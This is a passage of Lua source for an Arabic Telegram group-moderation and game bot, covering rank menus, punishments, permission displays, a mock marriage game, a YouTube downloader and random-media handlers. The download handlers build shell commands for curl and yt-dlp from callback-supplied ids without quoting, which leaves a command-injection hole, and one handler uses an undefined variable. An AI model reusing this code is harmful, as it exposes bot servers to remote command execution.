{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:Creator",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'منشى اساسي'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"},{text =IsStatu("BasicConstructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_BasicConstructor"}},
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:BasicConstructor",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'منشئ'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"},{text =IsStatu("Constructor",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Constructor"}},
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:Constructor",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مدير'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"},{text =IsStatu("Owner",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Owner"}},
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:Owner",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'ادمن'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"},{text =IsStatu("Administrator",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Administrator"}},
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif redis:sismember(bot_id..":"..chat_id..":Status:Administrator",data.sender_user_id) then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'مميز'" ,data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"},{text =IsStatu("Vips",infomsg[2],chat_id),data="promotion_"..data.sender_user_id.."_"..infomsg[2].."_Vips"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
end
elseif  infomsg[3] == "2" then
thetxt = "*↯︙قم بأختيار العقوبه الان .*"
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'حظر'" ,data="Punishment_"..data.sender_user_id.."_"..infomsg[2].."_bn"},{text = "'الغاء حظر'" ,data="Punishment_"..data.sender_user_id.."_"..infomsg[2].."_unbn"}},
{{text = "'طرد'" ,data="Punishment_"..data.sender_user_id.."_"..infomsg[2].."_kik"}},
{{text = "'تقييد'" ,data="Punishment_"..data.sender_user_id.."_"..infomsg[2].."_ked"},{text = "'الغاء تقييد'" ,data="Punishment_"..data.sender_user_id.."_"..infomsg[2].."_unked"}},
{{text = "'كتم'" ,data="Punishment_"..data.sender_user_id.."_"..infomsg[2].."_ktm"},{text = "'الغاء كتم'" ,data="Punishment_"..data.sender_user_id.."_"..infomsg[2].."_unktm"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
elseif  infomsg[3] == "3" then
local UserInfo = bot.getUser(infomsg[2])
if UserInfo.username and UserInfo.username ~= "" then
us1 = '['..UserInfo.first_name..'](t.me/'..UserInfo.username..')'
else
us1 = '['..UserInfo.first_name..'](tg://user?id='..UserInfo.id..')'
end
thetxt = "*↯︙معلومات حول *( "..us1.." )"
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'رتبته'" ,data="infoment_"..data.sender_user_id.."_"..infomsg[2].."_GetRank"}},
{{text = "'رسائله'" ,data="infoment_"..data.sender_user_id.."_"..infomsg[2].."_message"}},
{{text = "'سحكاته'" ,data="infoment_"..data.sender_user_id.."_"..infomsg[2].."_Editmessage"}},
{{text = "'نقاطه'" ,data="infoment_"..data.sender_user_id.."_"..infomsg[2].."_game"}},
{{text = "'جهاته'" ,data="infoment_"..data.sender_user_id.."_"..infomsg[2].."_Addedmem"}},
{{text = "'منو ضافه'" ,data="infoment_"..data.sender_user_id.."_"..infomsg[2].."_addme"}},
{{text = "🔙" ,data=data.sender_user_id.."_"..infomsg[2].."bkthk"}},
}
}
end
bot.editMessageText(chat_id,msg_id,thetxt, 'md', true, false, reply_markup)
end
----
if Text == data.sender_user_id.."bkt" then
reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'منشى اساسي'" ,data="changeofvalidity_"..data.sender_user_id.."_5"}},
{{text = "'منشئ'" ,data="changeofvalidity_"..data.sender_user_id.."_4"}},
{{text = "'مدير'" ,data="changeofvalidity_"..data.sender_user_id.."_3"}},
{{text = "'ادمن'" ,data="changeofvalidity_"..data.sender_user_id.."_2"}},
{{text = "'مميز'" ,data="changeofvalidity_"..data.sender_user_id.."_1"}},
}
}
bot.editMessageText(chat_id,msg_id,"*↯︙قم بأختيار الرتبه التي تريد تققيد محتوى لها*", 'md', true, false, reply_markup)
end
if Text and Text:match("^changeofvalidity_(.*)_(.*)") then
local infomsg = {Text:match("^changeofvalidity_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "↯︙الامر لا بخصك .", true)
return false
end   
redis:del(bot_id..":"..data.sender_user_id..":s")
if infomsg[2] == "1" then
rt = "مميز"
vr = "Vips"
elseif infomsg[2] == "2" then
rt = "ادمن"
vr = "Administrator"
elseif infomsg[2] == "3" then
rt = "مدير"
vr = "Owner"
elseif infomsg[2] == "4" then
rt = "منشئ"
vr = "Constructor"
elseif infomsg[2] == "5" then
rt = "منشئ الاساسي"
vr = "BasicConstructor"
end
redis:setex(bot_id..":"..data.sender_user_id..":s",1300,vr)
redis:setex(bot_id..":"..data.sender_user_id..":d",1300,rt)
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الروابط'" ,data="carryout_"..data.sender_user_id.."_Links"},{text =Rankrestriction(chat_id,vr,"Links"),data="carryout_"..data.sender_user_id.."_Links"}},
{{text = "'التوجيه'" ,data="carryout_"..data.sender_user_id.."_forwardinfo"},{text =Rankrestriction(chat_id,vr,"forwardinfo"),data="carryout_"..data.sender_user_id.."_forwardinfo"}},
{{text = "'التعديل'" ,data="carryout_"..data.sender_user_id.."_Edited"},{text =Rankrestriction(chat_id,vr,"Edited"),data="carryout_"..data.sender_user_id.."_Edited"}},
{{text = "'الجهات'" ,data="carryout_"..data.sender_user_id.."_messageContact"},{text =Rankrestriction(chat_id,vr,"messageContact"),data="carryout_"..data.sender_user_id.."_messageContact"}},
{{text = "'الصور'" ,data="carryout_"..data.sender_user_id.."_messagePhoto"},{text =Rankrestriction(chat_id,vr,"messagePhoto"),data="carryout_"..data.sender_user_id.."_messagePhoto"}},
{{text = "'الفيديو'" ,data="carryout_"..data.sender_user_id.."_messageVideo"},{text =Rankrestriction(chat_id,vr,"messageVideo"),data="carryout_"..data.sender_user_id.."_messageVideo"}},
{{text = "'المتحركات'" ,data="carryout_"..data.sender_user_id.."_messageAnimation"},{text =Rankrestriction(chat_id,vr,"messageAnimation"),data="carryout_"..data.sender_user_id.."_messageAnimation"}},
{{text = "'الملصقات'" ,data="carryout_"..data.sender_user_id.."_messageSticker"},{text =Rankrestriction(chat_id,vr,"messageSticker"),data="carryout_"..data.sender_user_id.."_messageSticker"}},
{{text = "'الملفات'" ,data="carryout_"..data.sender_user_id.."_messageDocument"},{text =Rankrestriction(chat_id,vr,"messageDocument"),data="carryout_"..data.sender_user_id.."_messageDocument"}},
{{text = "🔙" ,data=data.sender_user_id.."bkt"}},
}
}
bot.editMessageText(chat_id,msg_id,"↯︙قم باختيار ما تريد تقييده عن ( ال"..rt.."؛)", 'md', true, false, reply_markup)
end
if Text and Text:match("^carryout_(.*)_(.*)") then
local infomsg = {Text:match("^carryout_(.*)_(.*)")}
if tonumber(data.sender_user_id) ~= tonumber(infomsg[1]) then  
bot.answerCallbackQuery(data.id, "↯︙الامر لا بخصك .", true)
return false
end
vr = (redis:get(bot_id..":"..data.sender_user_id..":s") or  "Vips")
rt = (redis:get(bot_id..":"..data.sender_user_id..":d") or  "مميز")
redis:setex(bot_id..":"..data.sender_user_id..":s",1300,vr)
redis:setex(bot_id..":"..data.sender_user_id..":d",1300,rt)
if redis:get(bot_id..":"..chat_id..":"..infomsg[2]..":Rankrestriction:"..(redis:get(bot_id..":"..data.sender_user_id..":s") or  "Vips")) then
redis:del(bot_id..":"..chat_id..":"..infomsg[2]..":Rankrestriction:"..vr)
else
redis:set(bot_id..":"..chat_id..":"..infomsg[2]..":Rankrestriction:"..vr,true)
end
local reply_markup = bot.replyMarkup{
type = 'inline',data = {
{{text = "'الروابط'" ,data="carryout_"..data.sender_user_id.."_Links"},{text =Rankrestriction(chat_id,vr,"Links") ,data="carryout_"..data.sender_user_id.."_Links"}},
{{text = "'التوجيه'" ,data="carryout_"..data.sender_user_id.."_forwardinfo"},{text =Rankrestriction(chat_id,vr,"forwardinfo"),data="carryout_"..data.sender_user_id.."_forwardinfo"}},
{{text = "'التعديل'" ,data="carryout_"..data.sender_user_id.."_Edited"},{text =Rankrestriction(chat_id,vr,"Edited"),data="carryout_"..data.sender_user_id.."_Edited"}},
{{text = "'الجهات'" ,data="carryout_"..data.sender_user_id.."_messageContact"},{text =Rankrestriction(chat_id,vr,"messageContact"),data="carryout_"..data.sender_user_id.."_messageContact"}},
{{text = "'الصور'" ,data="carryout_"..data.sender_user_id.."_messagePhoto"},{text =Rankrestriction(chat_id,vr,"messagePhoto"),data="carryout_"..data.sender_user_id.."_messagePhoto"}},
{{text = "'الفيديو'" ,data="carryout_"..data.sender_user_id.."_messageVideo"},{text =Rankrestriction(chat_id,vr,"messageVideo"),data="carryout_"..data.sender_user_id.."_messageVideo"}},
{{text = "'المتحركات'" ,data="carryout_"..data.sender_user_id.."_messageAnimation"},{text =Rankrestriction(chat_id,vr,"messageAnimation"),data="carryout_"..data.sender_user_id.."_messageAnimation"}},
{{text = "'الملصقات'" ,data="carryout_"..data.sender_user_id.."_messageSticker"},{text =Rankrestriction(chat_id,vr,"messageSticker"),data="carryout_"..data.sender_user_id.."_messageSticker"}},
{{text = "'الملفات'" ,data="carryout_"..data.sender_user_id.."_messageDocument"},{text =Rankrestriction(chat_id,vr,"messageDocument"),data="carryout_"..data.sender_user_id.."_messageDocument"}},
{{text = "🔙" ,data=data.sender_user_id.."bkt"}},
}
}
bot.editMessageText(chat_id,msg_id,"↯︙قم باختيار ما تريد تقييده عن ( ال"..rt.."؛)", 'md', true, false, reply_markup)
end

function GetAdminsSlahe(chat_id,user_id,user2,msg_id,t1,t2,t3,t4,t5,t6)
local GetMemberStatus = bot.getChatMember(chat_id,user2).status
if GetMemberStatus.can_change_info then
change_info = '❬ ✔️ ❭' else change_info = '❬ ❌ ❭'
end
if GetMemberStatus.can_delete_messages then
delete_messages = '❬ ✔️ ❭' else delete_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_invite_users then
invite_users = '❬ ✔️ ❭' else invite_users = '❬ ❌ ❭'
end
if GetMemberStatus.can_pin_messages then
pin_messages = '❬ ✔️ ❭' else pin_messages = '❬ ❌ ❭'
end
if GetMemberStatus.can_restrict_members then
restrict_members = '❬ ✔️ ❭' else restrict_members = '❬ ❌ ❭'
end
if GetMemberStatus.can_promote_members then
promote = '❬ ✔️ ❭' else promote = '❬ ❌ ❭'
end
local reply_markupp = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '- تغيير معلومات المجموعة : '..(t1 or change_info), data = user_id..'/groupNum1//'..user2}, 
},
{
{text = '- تثبيت الرسائل : '..(t2 or pin_messages), data = user_id..'/groupNum2//'..user2}, 
},
{
{text = '- حظر المستخدمين : '..(t3 or restrict_members), data = user_id..'/groupNum3//'..user2}, 
},
{
{text = '- دعوة المستخدمين : '..(t4 or invite_users), data = user_id..'/groupNum4//'..user2}, 
},
{
{text = '- مسح الرسائل : '..(t5 or delete_messages), data = user_id..'/groupNum5//'..user2}, 
},
{
{text = '- اضافة مشرفين : '..(t6 or promote), data = user_id..'/groupNum6//'..user2}, 
},
{
{text = 'اخفاء الامر', data ='/delAmr'}
},
}
}
bot.editMessageText(chat_id,msg_id,"• صلاحيات المشرف - ", 'md', false, false, reply_markupp)
end
function GetAdminsNum(chat_id,user_id)
local GetMemberStatus = bot.getChatMember(chat_id,user_id).status
if GetMemberStatus.can_change_info then
change_info = 1 else change_info = 0
end
if GetMemberStatus.can_delete_messages then
delete_messages = 1 else delete_messages = 0
end
if GetMemberStatus.can_invite_users then
invite_users = 1 else invite_users = 0
end
if GetMemberStatus.can_pin_messages then
pin_messages = 1 else pin_messages = 0
end
if GetMemberStatus.can_restrict_members then
restrict_members = 1 else restrict_members = 0
end
if GetMemberStatus.can_promote_members then
promote = 1 else promote = 0
end
return{
promote = promote,
restrict_members = restrict_members,
invite_users = invite_users,
pin_messages = pin_messages,
delete_messages = delete_messages,
change_info = change_info
}
end


if Text and Text:match('(.*)/zwag_yes/(.*)/mahr/(.*)') then
local Data = {Text:match('(.*)/zwag_yes/(.*)/mahr/(.*)')}
if tonumber(Data[1]) ~= tonumber(user_id) then
return bot.answerCallbackQuery(data.id, "شو رأيك نزوجك بدالهم ؟", true)
end
if tonumber(user_id) == tonumber(Data[1]) then
if redis:get(bot_id.."zwag_request:"..Data[1]) then
local zwga_id = tonumber(Data[1])
local zwg_id = tonumber(Data[2])
local coniss = Data[3]
local zwg = bot.getUser(zwg_id)
local zwga = bot.getUser(zwga_id)
local zwg_tag = '['..zwg.first_name.."](tg://user?id="..zwg_id..")"
local zwga_tag = '['..zwga.first_name.."](tg://user?id="..zwga_id..")"
local hadddd = tonumber(coniss)
ballanceekk = tonumber(coniss) / 100 * 15
ballanceekkk = tonumber(coniss) - ballanceekk
local convert_mony = string.format("%.0f",ballanceekkk)
ballancee = redis:get(bot_id.."boob"..zwg_id) or 0
ballanceea = redis:get(bot_id.."boob"..zwga_id) or 0
zogtea = ballanceea + ballanceekkk
zeugh = ballancee - tonumber(coniss)
redis:set(bot_id.."boob"..zwg_id , math.floor(zeugh))
redis:sadd(bot_id.."roogg1",zwg_id)
redis:sadd(bot_id.."roogga1",zwga_id)
redis:set(bot_id.."roog1"..zwg_id,zwg_id)
redis:set(bot_id.."rooga1"..zwg_id,zwga_id)
redis:set(bot_id.."roogte1"..zwga_id,zwga_id)
redis:set(bot_id.."rahr1"..zwg_id,tonumber(coniss))
redis:set(bot_id.."rahr1"..zwga_id,tonumber(coniss))
redis:set(bot_id.."roog1"..zwga_id,zwg_id)
redis:set(bot_id.."rahrr1"..zwg_id,math.floor(ballanceekkk))
redis:set(bot_id.."rooga1"..zwga_id,zwga_id)
redis:set(bot_id.."rahrr1"..zwga_id,math.floor(ballanceekkk))
return bot.editMessageText(chat_id,msg_id,"كولولولولويششش\nاليوم عقدنا قران :\n\nالزوج "..zwg_tag.." 🤵🏻\n   💗\nالزوجة "..zwga_tag.." 👰🏻‍♀️\nالمهر : "..convert_mony.." دينار بعد الضريبة 15%\nتريد تشوفون وثيقة زواجكم اكتبوا : زواجي", 'md', false)
else
return bot.editMessageText(chat_id,msg_id,"انتهى الطلب وين كنتي لما طلب ايدك", 'md', false)
end
end
end
if Text and Text:match('(%d+)/zwag_no/(%d+)') then
local UserId = {Text:match('(%d+)/zwag_no/(%d+)')}
if tonumber(UserId[1]) ~= tonumber(user_id) then
return bot.answerCallbackQuery(data.id, "شو رأيك نزوجك بدالهم ؟", true)
else
redis:del(bot_id.."zwag_request:"..UserId[1])
redis:del(bot_id.."zwag_request:"..UserId[2])
return bot.editMessageText(chat_id,msg_id,"خليكي عانس ؟؟", 'md', false)
end
end
----
if Text and Text:match('(%d+)/company_yes/(%d+)') then
local Data = {Text:match('(%d+)/company_yes/(%d+)')}
if tonumber(Data[1]) ~= tonumber(user_id) then
return bot.answerCallbackQuery(data.id, "الطلب ليس لك", true)
end
if tonumber(user_id) == tonumber(Data[1]) then
if redis:get(bot_id.."company_request:"..Data[1]) then
local Cname = redis:get(bot_id.."companys_name:"..Data[2])
redis:sadd(bot_id.."company:mem:"..Cname, user_id)
redis:sadd(bot_id.."in_company:", user_id)
redis:set(bot_id.."in_company:name:"..user_id, Cname)
local mem_tag = "["..bot.getUser(user_id).first_name.."](tg://user?id="..user_id..")"
bot.sendText(Data[2],0, "اللاعب "..mem_tag.." وافق على الانضمام الى شركتك","md",true)
return bot.editMessageText(chat_id,msg_id,"تم قبول الطلب بنجاح",'md',false)
else
return bot.editMessageText(chat_id,msg_id,"انتهى الطلب للاسف", 'md', false)
end
end
end
if Text and Text:match('(%d+)/company_no/(%d+)') then
local UserId = {Text:match('(%d+)/company_no/(%d+)')}
if tonumber(UserId[1]) ~= tonumber(user_id) then
return bot.answerCallbackQuery(data.id, "الطلب ليس لك", true)
else
redis:del(bot_id.."company_request:"..UserId[1])
local mem_tag = "["..bot.getUser(user_id).first_name.."](tg://user?id="..user_id..")"
bot.sendText(Data[2],0, "اللاعب "..mem_tag.." رفض العمل في شركتك","md",true)
return bot.editMessageText(chat_id,msg_id,"تم رفض الطلب بنجاح", 'md', false)
end
end
----
if Text and Text:match('(%d+)/UnKed') then
    local UserId = Text:match('(%d+)/UnKed')
    if tonumber(UserId) ~= tonumber(user_id) then
    return bot.answerCallbackQuery(data.id, "• الامر لا يخصك", true)
    end
    bot.setChatMemberStatus(chat_id,user_id,'restricted',{1,1,1,1,1,1,1,1})
    return bot.editMessageText(chat_id,msg_id,"• تم التحقق منك يمكنك الدردشة الان", 'md', false)
    end
if Text and Text:match('/leftgroup@(.*)') then
local UserId = Text:match('/leftgroup@(.*)')
bot.answerCallbackQuery(data.id, "• تم مغادره البوت من المجموعة", true)
bot.leaveChat(UserId)
end
if Text and Text:match('(%d+)/cancelamr') then
local UserId = Text:match('(%d+)/cancelamr')
if tonumber(user_id) == tonumber(UserId) then
redis:del(bot_id.."Command:Reids:Group:Del"..chat_id..":"..user_id)
redis:del(bot_id.."Command:Reids:Group"..chat_id..":"..user_id)
redis:del(bot_id.."Command:Reids:Group:Del"..chat_id..":"..user_id)
redis:del(bot_id.."Command:Reids:Group"..chat_id..":"..user_id)
redis:del(bot_id.."Set:Manager:rd"..user_id..":"..chat_id)
redis:del(bot_id.."Set:Manager:rd:inline"..user_id..":"..chat_id)
redis:del(bot_id.."Zepra:Set:Rd"..user_id..":"..chat_id)
redis:del(bot_id.."Zepra:Set:On"..user_id..":"..chat_id)
redis:del(bot_id..":"..chat_id..":"..user_id..":Rp:set")
redis:del(bot_id..":"..chat_id..":"..user_id..":Rp:Text:rd")
return bot.editMessageText(chat_id,msg_id,"• تم الغاء الامر", 'md')
end
end

if Text and Text:match('(%d+)dl/(.*)') then
local xd = {Text:match('(%d+)dl/(.*)')}
local UserId = xd[1]
local id = xd[2]
if tonumber(data.sender_user_id) == tonumber(UserId) then
local get = io.popen('curl -s "https://xnxx.fastbots.ml/infovd.php?id=http://www.youtube.com/watch?v='..id..'"'):read('*a')
local json = json:decode(get)
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'تحميل صوت', data = data.sender_user_id..'sound/'..id}, {text = 'تحميل فيديو', data = data.sender_user_id..'video/'..id}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›', url = 't.me/QQOQQD'},
},
}
}
local txx = "["..json.title.."](http://youtu.be/"..id..""
bot.editMessageText(chat_id,msg_id,txx, 'md', true, false, reply_markup)
else
bot.answerCallbackQuery(data.id, "• هذا الامر لا يخصك ", true)
end
end
if Text and Text:match('(%d+)sound/(.*)') then
local xd = {Text:match('(%d+)sound/(.*)')}
local UserId = xd[1]
local id = xd[2]
if tonumber(data.sender_user_id) == tonumber(UserId) then
local u = bot.getUser(data.sender_user_id)
local get = io.popen('curl -s "https://xnxx.fastbots.ml/infovd.php?id=http://www.youtube.com/watch?v='..id..'"'):read('*a')
local json = json:decode(get)
local link = "http://www.youtube.com/watch?v="..id
local title = json.title
local title = title:gsub("/","-") 
local title = title:gsub("\n","-") 
local title = title:gsub("|","-") 
local title = title:gsub("'","-") 
local title = title:gsub('"',"-") 
local time = json.t
local p = json.a
local p = p:gsub("/","-") 
local p = p:gsub("\n","-") 
local p = p:gsub("|","-") 
local p = p:gsub("'","-") 
local p = p:gsub('"',"-") 
bot.deleteMessages(chat_id,{[1]= msg_id})
os.execute("yt-dlp "..link.." -f 251 -o '"..title..".mp3'")
bot.sendAudio(chat_id,0,'./'..title..'.mp3',"• ["..title.."]("..link..")\n• بواسطة ["..u.first_name.."](tg://user?id="..data.sender_user_id..") \n[@QQOQQD]","md",tostring(time),title,p) 
sleep(2)
os.remove(""..title..".mp3")
else
bot.answerCallbackQuery(data.id, "• هذا الامر لا يخصك ", true)
end
end
if Text and Text:match('(%d+)video/(.*)') then
local xd = {Text:match('(%d+)video/(.*)')}
local UserId = xd[1]
local id = xd[2]
if tonumber(data.sender_user_id) == tonumber(UserId) then
local u = bot.getUser(data.sender_user_id)
local get = io.popen('curl -s "https://xnxx.fastbots.ml/infovd.php?id=http://www.youtube.com/watch?v='..id..'"'):read('*a')
local json = json:decode(get)
local link = "http://www.youtube.com/watch?v="..id
local title = json.title
local title = title:gsub("/","-") 
local title = title:gsub("\n","-") 
local title = title:gsub("|","-") 
local title = title:gsub("'","-") 
local title = title:gsub('"',"-") 
bot.deleteMessages(chat_id,{[1]= msg_id})
os.execute("yt-dlp "..link.." -f 18 -o '"..title..".mp4'")
bot.sendVideo(chat_id,0,'./'..title..'.mp4',"• ["..title.."]("..link..")\n• بواسطة ["..u.first_name.."](tg://user?id="..data.sender_user_id..") \n[@QQOQQD]","md") 
sleep(4)
os.remove(""..title..".mp4")
else
bot.answerCallbackQuery(data.id, "• هذا الامر لا يخصك ", true)
end
end

if Text and Text:match('(%d+)/kanele') then
local UserId = Text:match('(%d+)/kanele')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text ='↯ : ﭑݪفِۅيسَ ، حِسب ذۅقيّ ♥️، '
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/kanele'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}

https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. chat_id .. '&voice=https://t.me/L_W_2/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/shaera') then
local UserId = Text:match('(%d+)/shaera')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,168);
local Text ='تم اختيار الشعر لك'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/shaera'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. chat_id .. '&voice=https://t.me/rteww0/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/aftar') then
local UserId = Text:match('(%d+)/aftar')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text ='تم اختيار افتار لك'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/aftar'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. chat_id .. '&photo=https://t.me/nyx441/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/memz') then
local UserId = Text:match('(%d+)/memz')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text ='تم اختيار ميمز لك'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/memz'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. chat_id .. '&voice=https://t.me/MemzDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/aftboy') then
local UserId = Text:match('(%d+)/aftboy')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text ='تم اختيار افتار شباب لك'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• امره أخرى •', callback_data =data.sender_user_id..'/aftboy'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. chat_id .. '&photo=https://t.me/avboytol/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/aftgir') then
local UserId = Text:match('(%d+)/aftgir')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text ='تم اختيار افتار بنات لك'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/aftgir'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. chat_id .. '&photo=https://t.me/QXXX_4/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/gifed') then
local UserId = Text:match('(%d+)/gifed')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,142);
local Text ='تم اختيار متحركه لك'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '•مره أخرى •', callback_data =data.sender_user_id..'/gifed'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendanimation?chat_id=' .. chat_id .. '&animation=https://t.me/LKKKKR/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/fillm') then
local UserId = Text:match('(%d+)/fillm')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text ='تم اختيار افلام لك'
keyboard = {}
keyboard.inline_keyboard = {
{
